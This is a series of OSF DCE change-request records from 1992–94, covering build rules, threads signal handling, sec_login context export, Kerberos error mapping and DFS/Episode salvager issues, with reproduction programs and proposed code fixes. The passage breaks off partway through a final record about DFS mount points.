Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : bld
Short Description             : Should be able to replace project rules selectively
Reported Date                 : 8/17/92
Found in Baseline             : 1.0.2
Found Date                    : 8/17/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[8/17/92 public]
It is impossible to replace any rules in the osf.<project>.mk file
because the rules in osf.std.mk are read later and stomp on
yours.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[8/18/92 public]
Corrected previous comments; the problem is that osf.std.mk reads in
osf.<project>.mk and then stomps on the project rules (thus making it
difficult to really create new projects).

[12/23/93 public]
Removed cjd as assignee.

[1/7/94 public]
Reassigned and lowered severity to C

[7/12/94 public]
Considering the fate of the ODE development effort and the new Reorg;
I think it is unrealistic to hope for clean, interchangable
build rules for the common makefiles.  The ability to easily create new 
projects using the current build environment is not an issue the DCE project
needs to concern itself with.  The build environment improvements should
speed up the development of DCE,  not speed up getting new projects 
started.

This CR should be canceled.

[7/13/94 public]
It certainly shouldn't be cancelled for that reason.  Regardless of the
future of ODE, it's still a defect in the DCE sources.

[7/13/94 public]
removed mason@transarc from 'opened-by' and 'dan@transarc' from interest
lists.  Mail bounced back from Transarc claiming these are no longer valid
addresses.



CR Number                     : 5022
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : PMAX cds should use POSIX calls, not BSD calls
Reported Date                 : 8/12/92
Found in Baseline             : 1.0.1
Found Date                    : 8/12/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/12/92 public]
when the POSIX alternative to bsd calls was added to cds
a while ago, the old interfaces were left conditional on _BSD.
OSF/1 supports all of the POSIX interfaces, so it should be
using them rather than the BSD interfaces.  I believe all that
is required is to change the compilation options. (and test it, of
course).

[8/25/92 public]
Since the BSD calls work as implemented, this is not a defect but rather
an enhancement request relating to code cleanup.



CR Number                     : 5003
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : FileConstruct via restore spuriously sets VV
Reported Date                 : 8/11/92
Found in Baseline             : 1.0.2
Found Date                    : 8/11/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[8/11/92 public]
The fileset restore path calls vnva_FileConstruct which eventually calls
epiv_CreateAnode which then bumps the fileset VV.  This is only foolish
since the fileset operation will soon reset both the file's VV and the
fileset's VV to the value it wants them to have.  But it is wasted
effort.
We'll need an extra bit passed in to supress this behavior, or we should
change the contract of epif_Create to never set the VV and the vnops
layer can call epif_Mark or not depending on whether it is being called
from the volops or not.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[8/26/92 public]
Bruce claims this should be an enhancement request.
Changed Defect or Enhancement? from `def' to `enh'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 4977
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : threads/cma_message.c
Short Description             : Porting issue: define
nl_sprintf for other platforms
Reported Date                 : 8/10/92
Found in Baseline             : 1.0.1
Found Date                    : 8/10/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/10/92 public]

        nl_sprintf (and two others) get defined only when building on
        AIX or OSF/1. WHne building on other platform, you don't see the
        problem until you try to link with cma.a or dce.a, then you get
        unsolved symbol.

Proposed Solution:

        If we don't know what value is proper for other platforms, at least
        we can make compiler error by saying sth. like 

        #ifndef nl_sprintf
        print error, check your system
        #endif

        so that poeple get aware ofthis problem before too late.



CR Number                     : 4920
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8237
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : signal handling
Short Description             : CMA loses SIGCHLD
Reported Date                 : 8/4/92
Found in Baseline             : 1.0.1
Found Date                    : 8/4/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/4/92 public]

  I found that there is a situation in which SIGCHLD gets lost i.e. sigwait()
does not receive SIGCHLD. The following program illustrates the situation.
This program used to work with dce.19e. I think there has been some
modification to CMA with respect to how SIGCHLD is handled but that should
not create this situation. You may verify that the problem is menifested
only with SIGCHLD by simply replacing SIGCHLD with SIGHUP. The program will
work as expected.

Note: The following program is assuming that while sigwaiting it will
first receive SIGCHLD and then SIGINT. This is not a valid assumption.
This assumption is not affecting the bug I'm trying to reproduce through
this program.

compile instruction: xlc_r -D_ALL_SOURCE -o sigchld_lost sigchld_lost.c
--------------------------------- sigchld_lost.c ---------------------
/*
 * sigchld_lost.c:
 *   This program finds out whether a sigwait() call loses the SIGCHLD
 * signal while waiting for other signals.
 *
 */

#include <pthread.h>
#include <stdio.h>
#include <errno.h>
#include <signal.h>

int doneFlag = 0;

char *msg = "\
\n    We expect to return form the next sigwait() waiting on SIGINT since\
\n    SIGINT signal should already be pending. If sigwait() does not return\
\n    it is probably an error. Press ^C to generate a new SIGINT signal and\
\n    the program will terminate normally.\n\n";

WaitThread()
{
    sigset_t waitUpon;
    int sig;

    (void) sigemptyset(&waitUpon);
    (void) sigaddset(&waitUpon, SIGCHLD);
    (void) sigaddset(&waitUpon, SIGINT);
    fprintf(stderr, "sigwait: waits on signals SIGCHLD(20), SIGINT(2)\n");
    if ((sig = sigwait(&waitUpon)) == -1) {
        fprintf(stderr, "sigwait: error (%d)\n", errno);
    } else {
        fprintf(stderr, "sigwait: returned because of signal %d\n", sig);
    }

    fprintf(stderr, msg);
    (void) sigemptyset(&waitUpon);
    (void) sigaddset(&waitUpon, SIGINT);
    fprintf(stderr, "sigwait: waits on signal SIGINT\n");
    if ((sig = sigwait(&waitUpon)) == -1) {
        fprintf(stderr, "sigwait: error (%d)\n", errno);
    } else {
        fprintf(stderr, "sigwait: returned because of signal %d\n", sig);
    }
    doneFlag = 1;
}

main(argc,argv,envp)
    int argc;
    char **argv;
    char **envp;
{
    pthread_t tid;
    sigset_t sigMask;

    (void) sigfillset(&sigMask);
    (void) sigdelset(&sigMask, SIGVTALRM);
    if (sigprocmask(SIG_SETMASK, &sigMask, NULL) == -1) {
        fprintf(stderr, "sigprocmask: error (%d)\n", errno);
        exit(1);
    }

    if (kill(getpid(), SIGCHLD) == -1) {
        fprintf(stderr, "kill: error (%d), signal SIGCHLD\n", errno);
    } else {
        fprintf(stderr, "kill: sent signal SIGCHLD\n");
    }
    if (kill(getpid(), SIGINT) == -1) {
        fprintf(stderr, "kill: error (%d), signal SIGINT\n", errno);
    } else {
        fprintf(stderr, "kill: sent signal SIGINT\n");
    }

    if (pthread_create(&tid, pthread_attr_default, WaitThread, NULL) == -1) {
        fprintf(stderr, "pthread_create: error (%d)\n", errno);
        exit(2);
    }

    while (doneFlag == 0)
        pthread_yield();

    exit(0);
}

[10/20/92 public]

OT cleanup 1 : Severity = unchanged(B) ;  Priority = unchanged(2)
               Assigned to keane.

[10/15/93 public]
This behavior is unfortunatly correct. See ot 8237 for a pretty complete
explaination of what the problem is. Basically the default action for
SIGCHILD on most implementations is to ignore it. POSIX states that 
such signals will not be received. This action can;t be changed with 
sigaction due to the fact that its an asyncronous signal and sigaction
is undefined for such signals according Draft 4 of the threads standard.
FOr these reasons sigwait will never see this signal. I'm not going to
completly cancel this but make it an enhancement request so we can look
at we might do to work around the problem, Its not a bug however.



CR Number                     : 4880
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : cma_timer.c
Short Description             : cma__check_timer_queue()
should return cma_c_false even when the queue is empty later on
Reported Date                 : 7/29/92
Found in Baseline             : 1.0.1
Found Date                    : 7/29/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/29/92 public]

No external symptoms other than the performance could be slightly better.

In cma_timer.c: cma__check_timer_queue() always returns cma_c_true, unless
        the queue is empty when the routine is entered.
        If the queue is not empty when the routine is entered and the
        queue becomes empty while in the routine,
        the value cma_c_true is still returned. This may return the wrong
        value to the null thread causing the wrong value to be passed
        to select.

In the normal case where a single timer is active (say one
pthread_delay_np),
when the timer expires, cma__check_timer_queue is called twice before
it returns false.

Repeat By:

Run once with one pthread_delay_np and trace the code to see
that cma__check_timer_queue will return true/false, when the timer expires
and is moved by cma___null_thread.

Proposed Solution:

Change cma__check_timer_queue() as follows:

Right after:
    if (!cma__queue_empty (&cma___g_timer_queue)) {

set ret_val to cma_c_true.

Later, right after:
        if (cma__queue_empty (&cma___g_timer_queue)) {
            cma__zero (&cma__g_next_tqe);

set ret_val to cma_c_false.

Delete:
        ret_val = cma_c_true;

right after the call to cma__subtract_time().



CR Number                     : 4877
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : threads/cma_util.c
Short Description             : Casting a char * to an int before arithmetic does not work on some hardware.
Reported Date                 : 7/29/92
Found in Baseline             : 1.0.1
Found Date                    : 7/29/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/29/92 public]

In cma_util.c:cma__strlen(), the line:
    return ((cma_t_integer)tmpstr - (cma_t_integer)s -1);
will return an incorrect value when the character pointers are not word
aligned. Since a Cray is not byte addressible, the compiler keeps the
byte within word in the high ordered bits of the char *. When casting
to an int, this results in large positive or negative numbers, ...

Repeat By:

Running the above (non-portable) code on a non-byte addressable machine.

Proposed Solution:

Change the above to:

    return (tmpstr - s - 1);



CR Number                     : 4851
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_login_ API
Short Description             : sec_login_export_context may "obtain" "unfinalized" login context
Reported Date                 : 7/27/92
Found in Baseline             : 1.0
Found Date                    : 7/27/92
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : h/sec_login_pvt.h client/login/sec_login{_pvt}.c
Sensitivity                   : public

[7/27/92 public]

Full Description:

When sec_login_import_context(3sec) is called with the name of the
exportable login context returned by a call to sec_login_export_context(3sec),
sec_login_import_context(3sec) will return sec_login_s_no_current_context,
unless the call to sec_login_export_context is preceded by a call to
sec_login_set_context(3sec), in which case the import returns error_status_ok.
In both cases, the call to sec_login_export_context returns error_status_ok.

 [pato ??/??/92 public]
Ron,
It looks to me like the export context call has a bug.  In the case you
cite, it should have failed.  Normally you need not call set_context - because
you are running in an environment that has a default context (i.e., you've run
login or dce_login).  It appears that in your example this was not true.
Since it wasn't true and the context passed to the export function had not been
"finalized" via a set_context call - state was not yet established to allow
the context to be exported.  We should either cause export to fail in this case
- or force it to finalize the context to a point that would allow the import
to succeed.  In either case, this appears to be a bug in export.

I didn't read the detail of the rest of your note, but from skimming, the
observations you've made look correct.
- joe

[10/19/92 public]

OT cleanup 1 : Severity = unchanged (C) ; Priority = unchanged (2)

N.B. In view of the workaround which seems to work, severity and priority
     have both been unchanged.

[10/19/92 public]
Put missing comment leader on Joe's comment, so you can tell that it's not just
part of the original defect comment.  There was no history info for when he
updated it, thus the ??/?? date.  Filled in the empty company field.

[12/15/92 public]
Submitted fix, marked 'fix'.  Verify by running the following test program
(should import with no errors if fixed):
#include <stdio.h>
#include <dce/sec_login.h>
#include <dce/passwd.h>
main()
{
    sec_passwd_rec_t		prec;
    sec_login_handle_t  	lc, lc2;
    error_status_t    		st;
    boolean32           	rp;
    sec_login_auth_src_t 	src;
    char                        buf[BUFSIZ];
    unsigned32		        len1, len2;
    if (! sec_login_setup_identity("cell_admin",sec_login_no_flags,&lc,&st)) {
	printf("Can't setup_identity: %x\n", st); exit(1);
    }
    prec.key.key_type = sec_passwd_plain;    prec.pepper = NULL;
    prec.key.tagged_union.plain = (unsigned char *) "-dce-";
    prec.version_number = sec_passwd_c_version_none;
    if (! sec_login_validate_identity(lc, &prec, &rp, &src, &st)) {
	printf("Can't validate_identity: %x\n", st); exit(2);
    }
    sec_login_export_context(lc, sizeof(buf), buf, &len1, &len2, &st);
    if (st) {
	printf("Unable to export context: %x\n", st); exit(3);
    }
    sec_login_import_context(sizeof(buf), buf, &lc2, &st);
    if (st) {
	printf("Unable to import context: %s %x\n", buf, st); exit(3);
    }
}

[1/3/93 public]

The above program generates a "Exception: Invalid memory address (dce / thd"
on PMAX running OSF/1.1.1 with a nightly build of approx 12/29 . 
I will come back to this after I have closed the other bugs in fixed state.

[1/26/93 public]
Removed fix for now, since it was causing 6917 and 6938.  Correct fix will
have to check new boolean value for whether context has been written out to
cred data file... instead of KRB_INFO(lcp).num_caches, which doesn't work
correctly for contexts obtained with sec_login_get_current_context().

[9/29/93 public]
After finally having time to look into this again (first time since Jan),
I've concluded that this is really a request for new functionality (a good
request that we do wish to implement, but it is new nevertheless...).  At
the moment, you have to do a sec_login_set_context() before you can do
sec_login_export_context().  This CR is asking that sec_login_export_context()
be able to do the whole set of operations if ...set_context() hasn't been done.
This new functionality is actually a good size change to the internal login
context handling and we'll look into doing it with the massive amounts of
other sec_login changes we have to make for 1.1 anyway.



CR Number                     : 4814
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : Fix hack in server/back_combine.c
Reported Date                 : 7/23/92
Found in Baseline             : 1.0.1b25
Found Date                    : 7/23/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/23/92 public]
From the file:
     * THIS IMPLEMENTATION IS A MINOR HACK!!!  Please note that
     * wait is done by looping, whereas calculating the exact time to
     * wait would be much better.  The threads package doesn't have such
     * a feature, and there's no time to write one right now.

[8/25/92 public]
The code works so change it from defect to enhancement. The fix is to
delete the comment.



CR Number                     : 4802
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : salvager damaged file list handling inconsistent
Reported Date                 : 7/21/92
Found in Baseline             : 1.0.1b20
Found Date                    : 7/21/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[7/21/92 public]
As per discussion with Ted, it will be useful to better organise the
"lists" information output by the salvager at the end. Currently
filenames can be displayed in multiple lists e.g.
- "Ought to restore" and "May restore" for a truncated file with
  modified ACLs.
- "May restore" and "badACLs"/"badPlists". The badACLs/badPlists lists
  give more information about why some filenames are in the "May
  Restore" list.
- I think it is possible for filenames to appear on both the "Ought to
  restore" and the "dupAnode" lists. Again the dupAnode list in this
  case provides more information about why the filename is in the former
  list.
The information provided in the badACLs, dupAnode, badPlists,
zeroLinkCnt and the badLinkCnts lists may not be wanted by default by an
administrator. Hence it might be useful add another switch to the
salvage command that would enable display of these lists. This
information could also always go into the SalvageLog file.
In case of filenames appearing in both "Ought to restore" and "May
restore", the former list can take precedence over the latter and the
filename deleted from the latter list.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/22/92 public]
Changed Subcomponent Name from `episode salvager' to `lfs' 
Changed Short Description from `Output from salvager' to `salvager damaged file 
 list handling inconsistent'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 4801
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : salvager adds unreferenced anodes to ZLC list
Reported Date                 : 7/21/92
Found in Baseline             : 1.0.1b20
Found Date                    : 7/21/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[7/21/92 public]
Files for which the link counts in the anode were changed to zero by
the salvager are attached to the zero link count list. It should be
possible to view the contents of these files and decide whether to
delete or keep them. Creation of a "lost+found" directory may be
difficult given that episode aggregates are not mounted but filesets
are. A approach that could be used is to add another utility that
traverses and prints the zero link count file contents and as per
instructions of the adminstrator delete the file or move/copy it to
another place in the filesystem.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/22/92 public]
Since unreferenced files are determined on a per fileset basis to
unmountability of aggregates is irrelevant.  The lost+found approach
would be implemented in each fileset.  Creating such a directory during
salvage is extra trouble but might be a significant help to a system
administrator trying to put a file system back together.
That the salvager adds unreferenced files to the ZLC list is correct in
the strictest sense but does confuse the use of that mechanism.  Files
on the ZLC list are put their explicitly by an unlink system call.
Files the salvager puts there are those which were orphaned by some
error and is the equivalent of deleting these files during salvage.  It
may be valuable to keep these two types distinct.
Changed Subcomponent Name from `episode salvager' to `lfs' 
Changed Short Description from `unreferenced anodes' to `salvager adds 
 unreferenced anodes to ZLC list'

[11/11/93 public]
Upgraded sev,prio to be more plausible.
Changed Severity from `E' to `C' 
Changed Priority from `4' to `3'

[11/11/93 public]
Opened as db4674 in Transarc's database.
Changed Subcomponent Name from `lfs' to `EPISODE' 
Filled in Reported by Company's Ref. Number with `4674'



CR Number                     : 4728
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 4714
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Kerberos error codes returned from routines in sec_login_pvt.c
Reported Date                 : 7/15/92
Found in Baseline             : 1.0
Found Date                    : 7/15/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/15/92 public]

    Some of the security functions do not adequately mask off kerberos errors.
    (e.g allocate_krb_info in security/client/login/sec_login_pvt.c). In
    some cases, these error codes are passed directly up through the api
    to the application developer. In some more carefully handled cases,
    kerberos error values are "masked" into a single sec_ error code.

    The kerberos error codes are not documented in the DCE documentation which
    makes life very difficult for an application developer.

    Also, mapping the kerberos error to a generic sec_ error indicating
    that a kerberos error occured makes it difficult to determine what
    actually went wrong.

Repeat By:

Code inspection.

Proposed Solution:

     Only sec_ codes should be returned through the api, The kerberos
     errors should be mapped to an appropriate sec error which helps the
     application developer fix the problem. In general, the "a kerberos error
     occured" approach should be reserved for problems whose cause cannot
     be expected to be resolved by changing the way the function which
     returned the error was called.

[10/19/92 public]

OT cleanup 1 : New severity = C ;  New priority = 2
               Old severity = E ;  Old priority = 4

N.B. This is a significant problem and does impact users/programmers.
     Hence the severity of C and priority of 2. I have marked it as
     C2 merely because in general finding and fixing all the places 
     kerberos error codes and convertng of kerberos error codes may 
     take up so much time that it may prevent the meeting of other exit
     criteria (e.g. meeting the defect density ).

[10/20/92 public]

Converted the defect into an enhancement. This is consistent with other
similar enhancements logged against the propagation of error codes.
I will leave the priority at C2 because this is still an important
enhancement.



CR Number                     : 4714
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Kerberos error codes / UNIX errnos returned by sec_key_mgmt API functions.
Reported Date                 : 7/14/92
Found in Baseline             : 1.0
Found Date                    : 7/14/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/key_mgmt/seckey_del.c
Sensitivity                   : public

[7/14/92 public]

Full Description:

The sec_key_mgmt functions can pass up UNIX errnos or kerberos error codes.

A very common case of UNIX errnos being passed up is ENOENT (errno = 2)
when a key table file does not exist. When EACCES is returned (errno = 13),
this is intercepted in the key_mgmt API functions which call the kerberos
key table access functions - in this case, the error is reset to
sec_key_mgmt_e_unauthorized.

In the ENOENT case, we should have a return code such as
sec_key_mgmt_e_no_such_key_table to show that the key table file does not
exist - this is a very serious omission.

Two specific cases of kerberos error codes being passed up and not
intercepted are the API functions sec_key_mgmt_delete_key and
sec_key_mgmt_delete_key_type.

Here the functions do not test for KRB5_KT_NOTFOUND which corresponds
to the error sec_key_mgmt_e_key_unavailable.  It should be straightforward
to map the kerberos error codes onto sec_key_mgmt_e codes - the problem
is in finding where the errors have been missed.

Repeat By:

Code inspection and running test cases.

Proposed Solution:

Context diff for fixes to DCE1 version of seckey_del.c follows :

Basically, the added lines check for KRB5_KT_NOTFOUND and reset
the error codes. These changes fix sec_key_mgmt_delete_key and
sec_key_mgmt_delete_key_type.

*** seckey_del.c        Fri Jul  3 19:10:59 1992
--- tmp.c               Fri Jul  3 19:10:23 1992
***************
*** 122,131 ****
              *err = sec_key_mgmt_e_unauthorized;
          }

-         else if (*err == KRB5_KT_NOTFOUND) {
-             *err = sec_key_mgmt_e_key_unavailable;
-         }
-
          /*
           * Release storage for parsed name.
           */
--- 122,127 ----
***************
*** 239,248 ****

          if (*err == EACCES) {
              *err = sec_key_mgmt_e_unauthorized;
-         }
-
-         else if (*err == KRB5_KT_NOTFOUND) {
-             *err = sec_key_mgmt_e_key_unavailable;
          }

          /*
--- 235,240 ----
--

[10/19/92 public]

OT cleanup 1 : Severity = unchanged (2) ; Priority = unchanged (2)

N.B. This is a significant problem and does impact users/programmers.
     Hence the severity and priority have been left unchanged.

[10/20/92 public]

Converted the defect into an enhancement. This is consistent with other
similar enhancements logged against the propagation of error codes.
I will leave the priority at C2 because this is still an important
enhancement.



CR Number                     : 4627
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Episode should have local machdep.mk files
Reported Date                 : 7/7/92
Found in Baseline             : 1.0.1
Found Date                    : 7/7/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jdp@transarc.com

[7/7/92 public]
The episode source directory should have <machine type>/machdep.mk files that
are included by each Episode makefile.  This would allow machine-specific
build configuration for the Episode sub-system. For example, AIX VM integration
could be turned on or off by a line in the AIX/RIOS machdep.mk file.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jdp@transarc.com' 
Added field Transarc Status with value `open'

[7/7/92 public]
This is an enhancement request. Marked as such.
Changed Defect or Enhancement? from `def' to `enh'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 4601
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Cannot attach or mount episode aggregates.
Reported Date                 : 7/6/92
Found in Baseline             : 1.0.1b23
Found Date                    : 7/6/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[7/6/92 public]

Using the new AIX 3.2 supporting drop (From Wednesday) I tried
creating and using an episode file system.  Creation worked fine; when
I tried to attach the aggregate I got error # 109 (ENOSYS) which does
not make much sense.

I tried using older AIX 3.1 binaries (from build 22) on the 3.2 system
and it worked.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jdp@transarc.com' 
Added field Transarc Status with value `open'

[7/6/92 public]
Added people to the CC list.

Changed Interest List CC from `jwade%liz.austin.ibm.com@transarc.com' to 
 `jwade%liz.austin.ibm.com@transarc.com,ota@transarc.com,jdp@transarc.com'

[7/6/92 public]
I found out what is going on here.  It was not finding dfsloadobj and
because of this was returning ENOSYS.  I'd like to see some extra code
set up here so that it examines an environment variable first and uses
that version if it exists, using "/opt/dcelocal/ext/dfsloadobj".  This is
an enhancement, though, so I've marked it as such and lowered its priority.

Changed Defect or Enhancement? from `def' to `enh' 
Changed Severity from `A' to `C' 
Filled in Priority with `3'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[7/29/92 public]
Reassign to Elliot.
Changed Interest List CC from 
 `jwade%liz.austin.ibm.com@transarc.com,ota@transarc.com,jdp@transarc.com' to 
 `' 
Changed Responsible Engr. from `mason@transarc.com' to `jaffe@transarc.com' 
Changed Transarc Herder from `jdp@transarc.com' to `jaffe@transarc.com'



CR Number                     : 4594
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : make log pass numbers be 32 bits.
Reported Date                 : 7/3/92
Found in Baseline             : 1.0.1b20
Found Date                    : 7/3/92
Severity                      : C
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[7/3/92 public]
The log pass # is currently only a 16 bit number.  It really should be
a 32 bit number.  Fortunately, there is an adjacent field which is
really not needed; we will eliminate this field, too.
The real reasoning behind this is pretty esoteric - we are concerned
about logs which constantly get restarted but never manage to write
every block in the log.  Eventually, we will have greater than
(max-pass/2) spread and our recovery algorithm will break.  Adding an
extra 16 bits makes this a non-issue.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[8/31/92 public]
This would entail a log-format change.  Frankly, the problem is not so
severe it should warrant a log-format change.  Cancelled.
Changed Status from `open' to `cancel'

[9/1/92 public]
Ted believes this is still a useful improvement; re-opened and changed
to be an enhancement.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Status from `cancel' to `open'

[11/16/92 public]
Should this be deferred out of 1.0.2?  Or cancelled?

[11/17/92 public]
We should NOT cancel this defect.  As a low priority disk format change
it should be deferred until the next time we have to change the log
format.
Changed Severity from `B' to `C' 
Changed Priority from `1' to `4'

[11/17/92 public]
Reassigned to Ted.
Changed Interest List CC from `ota@transarc.com' to `' 
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 4574
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : px
Short Description             : present /etc/mount points as dfs mountpoints
Reported Date                 : 7/1/92
Found in Baseline             : 1.0.1
Found Date                    : 7/1/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[7/1/92 public]
Currently if an /etc/mount point is reached in a fileset being exported
by a DFS fileserver, a ENOENT is returned for the object because it
resides in a different "fileset".  Even if this fileset is exported
